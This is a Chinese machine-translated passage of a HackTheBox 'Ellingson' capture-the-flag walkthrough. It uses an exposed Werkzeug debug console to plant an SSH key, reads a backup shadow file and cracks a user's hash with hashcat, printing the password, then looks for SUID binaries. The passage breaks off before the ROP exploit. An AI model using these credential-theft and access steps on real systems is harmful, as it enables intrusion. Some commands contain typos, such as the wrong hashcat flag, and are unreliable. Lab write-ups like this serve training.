<html>
<head>
<title>HacktheBox — Ellingson</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子——艾林森</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-ellingson-7c9a8a87dccb?source=collection_archive---------0-----------------------#2019-10-19">https://infosecwriteups.com/hackthebox-ellingson-7c9a8a87dccb?source=collection_archive---------0-----------------------#2019-10-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="75a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于我如何解决黑客盒子里的Ellingson的文章</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/5aa8a901b7f58349d7a52df29e9af9fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/1*8OPrSO1U1hqnTUvSBNVpUQ.png"/></div></figure><p id="8aae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kt" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="0923" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像往常一样，我试图解释我是如何从机器上理解这些概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。</p><h1 id="fa98" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">关于盒子:</h1><p id="2789" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated"><strong class="jp ir"> Ellingson </strong>是一台我以为因为根部问题而无法解决的机器。它从一个错误配置的web服务器开始，暴露了一个解释器，允许我编辑文件并通过ssh登录。然后我看到我是<strong class="jp ir"> adm </strong>组的一员，并且我拥有对shadow.bak文件的读取权限。破解其中一个散列，它允许我登录以获取user.txt。然后我看到一个具有根权限的setuid二进制文件，然后我通过使用<strong class="jp ir"> ROP </strong>(面向返回的编程)来利用它获得根shell。</p><p id="b022" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi lx translated">isclaimer:我对二进制开发非常陌生，即使我在大学时遇到过汇编语言，我也没有把它当回事，而且我从未想过我会在我选择从事的职业中遇到它。</p><h1 id="ff1e" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">侦察:</h1><p id="9b16" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我首先通过调用命令运行初始nmap扫描，将其保存到我的nmap目录:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="6999" class="ml kv iq mh b gy mm mn l mo mp">namap -sV -sC -oA nmap/initial 10.10.10.139</span></pre><p id="ad26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="9860" class="ml kv iq mh b gy mm mn l mo mp">Nmap scan report for 10.10.10.139<br/>Host is up (0.32s latency).<br/>Not shown: 998 filtered ports<br/>PORT   STATE SERVICE VERSION<br/>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)<br/>|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)<br/>|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)<br/>80/tcp open  http    nginx 1.14.0 (Ubuntu)<br/>|_http-server-header: nginx/1.14.0 (Ubuntu)<br/>| http-title: Ellingson Mineral Corp<br/>|_Requested resource was <a class="ae kt" href="http://10.10.10.139/index" rel="noopener ugc nofollow" target="_blank">http://10.10.10.139/index</a><br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="731d" class="ml kv iq mh b gy mq mn l mo mp">Service detection performed. Please report any incorrect results at <a class="ae kt" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .</span></pre><p id="c237" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到只打开了SSH和HTTP，我先检查HTTP。</p><h1 id="fa5c" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">端口80(nginx)</h1><p id="c64e" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我看到一家公司的登录页面似乎被黑了。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi mr"><img src="../Images/b38f875bf286abfba08adb5cbd68098b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bTNUQvF_ir0U0xV-AUj5oQ.png"/></div></div></figure><p id="f172" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向下浏览页面，我看到可能的用户名，因为他们似乎是为Ellingson公司工作。记下他们的名字，甚至他们的姓氏，因为这可以在以后用作密码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi mw"><img src="../Images/29477e4d71762f17ef1cf8ef43721c1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VcV4C6jjeKUym_Q_QEHyuA.png"/></div></div></figure><p id="8a39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可能的用户名有:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="6307" class="ml kv iq mh b gy mm mn l mo mp">hal, margo, eugene, duke, wallace, belford, ellingson</span></pre><p id="0785" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我查看网站上的文章。</p><h2 id="b583" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">第一条</h2><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ni"><img src="../Images/0d538e49789b8e240c2d5e8e49d3ab46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*myQZkKkem3d2wBLuLF1mkA.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="cb77" class="ml kv iq mh b gy mm mn l mo mp"><em class="nj">A recent unknown intruder penetrated using a super user account giving him access to our entire system. Yesterday the ballest program for a supertanker training model mistakenly thought the vessel was empty and flooded it's tanks. This caused the vessel to capsize, a virus planted within the Ellingson system claimed responsibility and threatened to capsize more vessels unless five million dollars are transfered to their accounts.</em></span></pre><p id="c82c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">据说他们的公司被一个超级用户账号入侵了。</p><h2 id="28c9" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">第二条</h2><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nk"><img src="../Images/4f9780f5cf1581b8a1a5b6f5fadd62c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-kzaWgYWGKlf2X818A9Avw.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="c697" class="ml kv iq mh b gy mm mn l mo mp"><em class="nj">Due to the recent security issues we have implemented protections to block brute-force attacks against network services. As a result if you attempt to log into a service more then 5 times in 1 minute you will have your access blocked for 5 minutes. Additional malicious activity may also result in your connection being blocked, please keep this in mind and do not request resets if you lock yourself out ... take the 5 minutes and ponder where you went wrong :)</em></span></pre><p id="434f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查第2条，好像有一个阻止暴力破解的机制。所以我不能只是启动一个目录扫描或者如果我找到一个登录页面，我不能只是使用像Hydra或wfuzz这样的工具。</p><h2 id="9769" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">第三条</h2><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nl"><img src="../Images/02ab890bd0218ee6cc7a97d9174b2b99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0ygNW8sjBL1tokgarQ-uEg.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="cfd0" class="ml kv iq mh b gy mm mn l mo mp"><em class="nj">We have recently detected suspicious activity on the network. Please make sure you change your password regularly and read my carefully prepared memo on the most commonly used passwords. Now as I so meticulously pointed out the most common passwords are. Love, Secret, Sex and God -The Plague</em></span></pre><p id="99e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查第三条，有提醒定期更换密码，不要使用最常用的密码。常见的密码是爱情、秘密、性和上帝。我可以记下这一点，因为以后我可能会使用这些密码登录。</p><h1 id="d938" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">最初的立足点</h1><p id="f1d3" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">注意，网址是10.10.10.139/articles/ <article_number>。然后，我尝试访问第4篇文章，看看是否有隐藏的文章，或者页面是否会崩溃。</article_number></p><h2 id="4950" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">第四条</h2><p id="d97a" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">检查第4条，我得到一个内置的。索引错误，因为数字“4”超出范围。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nm"><img src="../Images/1012bbe5e42f8b16c97c6fcfb25eb084.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k_5uJK-rTbKUE9wJPQ8o-Q.png"/></div></div></figure><p id="e91b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向下滚动，我看到它使用了<a class="ae kt" href="https://www.fullstackpython.com/wsgi-servers.html" rel="noopener ugc nofollow" target="_blank"> WSGI </a>。它还说当我把鼠标放在框架上时，我可以执行代码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nn"><img src="../Images/642be40e7b3a8560f7cb48709f33bffb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WAyJkHXIYLq7O45eJGUy5w.png"/></div></div></figure><p id="cbae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">鼠标移到旁边:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi no"><img src="../Images/cb7dcd37e86f0d34610bba16fc08f345.png" data-original-src="https://miro.medium.com/v2/resize:fit:704/format:webp/1*EM9d-T9h1tWKALzXrBqqUQ.png"/></div></figure><p id="c933" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我得到一个交互式外壳:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi np"><img src="../Images/eff6a236df5709e649de8ca350d1da8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GgvirOjWNkR9NK2yoyzesg.png"/></div></div></figure><p id="ebad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我导入操作系统，然后尝试执行命令。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/49828787a16bf8efbcad454ef82762bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1212/format:webp/1*X8uzuA0gSj6sKpwNaASI2A.png"/></div></figure><p id="0a5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查我的有效用户id及其1001。然后，我尝试通过将/etc/passwd加载到我的filehandler(名为file:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nr"><img src="../Images/a18be43b974c6dbd84275955a132cf1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A50tq75BwuLeCHSDtOU9wQ.png"/></div></div></figure><p id="cadd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在可以看到可能的用户名。这些是网页上的相同用户名。因为我的UID是1001，所以我实际上是用户<strong class="jp ir"> hal </strong>。</p><p id="b431" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在将尝试列出我的主目录</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ns"><img src="../Images/93bc19b97d3d339b90461f1e1e28b445.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qyvQ0VseS73qXZl8WrGdOg.png"/></div></div></figure><p id="bbbe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于hal可以ssh，我现在尝试将我的公钥添加到authorized_keys中，这样我就可以通过ssh登录了。我首先制作一对密钥:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nt"><img src="../Images/46c60c26c38232129cdaae388346ccc6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rdLfRUIJ5gHXFdrAe58J3g.png"/></div></div></figure><p id="77b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我打开文件并添加我的公钥(我将public_key设置为生成的公钥):</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nu"><img src="../Images/ffa93bc454a6a83a51377b9f3bcb5680.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NN8WXmrmJfZHFBsnQWtZ7g.png"/></div></div></figure><p id="c6e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，当我以用户hal的身份使用ssh时，我就进入了。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nv"><img src="../Images/2f9785c2baef36cf9bbe25f13e255f13.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ru4Sdpens8d58jUahru_Cw.png"/></div></div></figure><h2 id="1ccf" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">枚举hal</h2><p id="e553" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我通常做的是运行<a class="ae kt" href="https://github.com/rebootuser/LinEnum" rel="noopener ugc nofollow" target="_blank"> LinEnum </a>，但由于某种原因，我无法建立到我的http服务器的连接。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nw"><img src="../Images/e26d112e484cb85e66df2a828ea55c92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cC8GDDMvs5NPivCVQOckdQ.png"/></div></div></figure><p id="6919" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我也试着ping自己，但是没用:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nx"><img src="../Images/cc4b085c79ade29fc4deb3d02a749543.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sQnFjnECD7Nvkl4Oo5S95w.png"/></div></div></figure><p id="bfa3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我记得我以用户hal的身份拥有ssh访问权限，然后我使用scp将LinEnum传输到机器:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ny"><img src="../Images/9e361259f567d93b681f7c8e6f1016c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2ZNYDvwa97OAYj1nvROE3w.png"/></div></div></figure><p id="6333" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我有了LinEnum，我运行它:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nz"><img src="../Images/e39b6696c182f7b15d47d168669664d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zfiqt8wSsTDyB7dhgbEnjg.png"/></div></div></figure><p id="1537" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行LinEnum后，我发现用户hal是adm组的一部分。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/373fe0ac8e1f881335466d4828bd7e46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1206/format:webp/1*gxRIjFg10vYXPJ_U1US0EA.png"/></div></figure><blockquote class="ob oc od"><p id="2b67" class="jn jo nj jp b jq jr js jt ju jv jw jx oe jz ka kb of kd ke kf og kh ki kj kk ij bi translated"><strong class="jp ir"> adm: </strong>组adm用于系统监控任务。该组的成员可以读取/var/log中的许多日志文件，并且可以使用xconsole。历史上，/var/log是/usr/adm(以及后来的/var/adm)，因此是该组的名称。</p></blockquote><p id="0a08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里阅读更多关于Debian默认系统组的信息:</p><div class="oh oi gp gr oj ok"><a href="https://wiki.gacq.com/index.php/Debian_default_system_groups_description" rel="noopener  ugc nofollow" target="_blank"><div class="ol ab fo"><div class="om ab on cl cj oo"><h2 class="bd ir gy z fp op fr fs oq fu fw ip bi translated">Debian默认系统组描述</h2><div class="or l"><h3 class="bd b gy z fp op fr fs oq fu fw dk translated">root之后是默认用户列表(以及相应的组): Root(通常)是超级用户。守护进程:一些…</h3></div><div class="os l"><p class="bd b dl z fp op fr fs oq fu fw dk translated">wiki.gacq.com</p></div></div></div></a></div><p id="8666" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我先运行id，我可以在不运行LinEnum的情况下捕获它。</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="2e14" class="ml kv iq mh b gy mm mn l mo mp">hal@ellingson:/tmp$ id<br/>uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)</span></pre><p id="90c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我通过调用以下命令来检查adm组拥有的文件:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="bdfe" class="ml kv iq mh b gy mm mn l mo mp">find / -group adm 2&gt;/dev/null</span></pre><p id="c50a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/5011908f7b35673e3849d0a2413b161b.png" data-original-src="https://miro.medium.com/v2/resize:fit:596/format:webp/1*jhUTFQSNQQua7mm0KuBqEQ.png"/></div></figure><p id="e15b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">shadow.bak文件很有意思。然后我检查我对它的权限:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/c7d27c7234d84e24d4f512fe27391337.png" data-original-src="https://miro.medium.com/v2/resize:fit:1354/format:webp/1*-3G5DFgSSloV778dM0Iuuw.png"/></div></figure><p id="bb06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">组adm具有读取权限，我读取它并找到哈希:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ov"><img src="../Images/ddf50b8397ef377ff2017cdc8007703d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TpzHj4o8fpmXc8_OzvU3pA.png"/></div></div></figure><p id="3b36" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为散列从$6$开始，所以这些是Unix的SHA-512散列。我调用<em class="nj"> hashcat - example-hashes，</em>寻找这个散列的模式号。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ow"><img src="../Images/d8156d5ba158e0ecff55dc3a8e1c7e09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o_DLmMSxsuSP2Mtm6rteyw.png"/></div></div></figure><p id="2a29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在破解使用rockyou找到的散列之前，请记住第3篇文章中所说的内容:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="dff5" class="ml kv iq mh b gy mm mn l mo mp"><em class="nj">We have recently detected suspicious activity on the network. Please make sure you change your password regularly and read my carefully prepared memo on the most commonly used passwords. Now as I so meticulously pointed out the most common passwords are. </em><strong class="mh ir"><em class="nj">Love, Secret, Sex and God</em></strong><em class="nj"> -The Plague</em></span></pre><p id="8a3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于密码重用很常见，因此我尝试通过删除上述常见密码并将其保存到名为rockyou.modified的文件中来减少单词列表rockyou。</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="9095" class="ml kv iq mh b gy mm mn l mo mp">grep -iE 'Love|Secret|Sex|God' /usr/share/wordlists/rockyou.txt &gt; rockyou.modified</span></pre><p id="71af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意，还是277，308行。LOL。</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="9a3f" class="ml kv iq mh b gy mm mn l mo mp">root@kali:~/Documents/htb/boxes/ellingson/writeup# wc -l rockyou.modified <br/>277308 rockyou.modified</span></pre><p id="cbee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我运行hashcat:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="f128" class="ml kv iq mh b gy mm mn l mo mp">hashcat -a 1800 rockyou.modified ellingson.hashes</span></pre><p id="4a5e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我破解了玛戈的哈希。</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="dcbc" class="ml kv iq mh b gy mm mn l mo mp">$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:<strong class="mh ir">iamgod$08</strong></span></pre><p id="27fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我试着用凭证ssh<strong class="jp ir">Margo:iam god $ 08</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ox"><img src="../Images/3f19a135cadf8e7f86cf85ff47669822.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CoztCfVTp2Adbb_a_iW1FQ.png"/></div></div></figure><p id="b7da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我进去了，现在我可以读user.txt了:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="de90" class="ml kv iq mh b gy mm mn l mo mp">margo@ellingson:~$ cat user.txt <br/><strong class="mh ir">d0ff9e3f9da8bb...</strong></span></pre><h1 id="4a74" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">获取根目录:</h1><p id="b6ea" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi lx translated">iscalimer:这才是乐趣真正开始的地方。我不会试图解释这方面的每一个细节，因为我自己还在学习。在此之前，我只做过最少的二进制开发，所以我可能会误导您。我建议您查看一下0xdf、ippsec和snowscan的演练，因为它们会比我更好地解释这一点。我的目的是告诉你我是如何得到根壳的。观看<a class="ae kt" href="https://www.youtube.com/watch?v=6S4A2nhHdWg" rel="noopener ugc nofollow" target="_blank"> ippsec的bitterman视频</a>是一个很好的开始。我的代码看起来会像他在视频里做的一样。</p><p id="a905" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当试图提升特权时，我首先检查的是设置了SUID位的二进制文件。在权限上设置的SUID位在所有者的上下文中运行。这意味着如果我可以运行程序(root用户拥有的程序)并利用漏洞，我就有可能在root用户的上下文中执行代码。我可以通过调用以下命令来检查它:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="88f3" class="ml kv iq mh b gy mm mn l mo mp">find / -perm -4000 2&gt;/dev/null</span></pre><p id="b07b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/71a46ca4c4570d5f04ec67da65ec6c86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1084/format:webp/1*xXa1M_KGk-olNPuFK9SEFQ.png"/></div></figure><p id="b7ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在检查其权限:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oz"><img src="../Images/b73a5fe2b217b5aeb23c8f9eb81956de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/1*scAtGIVxldi-v8N9WPrl-w.png"/></div></figure><p id="f8c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我试着运行二进制文件并输入垃圾数据:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/7ef2f6c5bb6bc1ed1a5ceb5b1865002c.png" data-original-src="https://miro.medium.com/v2/resize:fit:790/format:webp/1*PnJ-whrDTjUA1YZxI67sQA.png"/></div></figure><p id="76c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为/usr/bin/garbage非常突出，所以我将一个副本发送到我的本地机器上检查它，并对它运行file:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="2e7e" class="ml kv iq mh b gy mm mn l mo 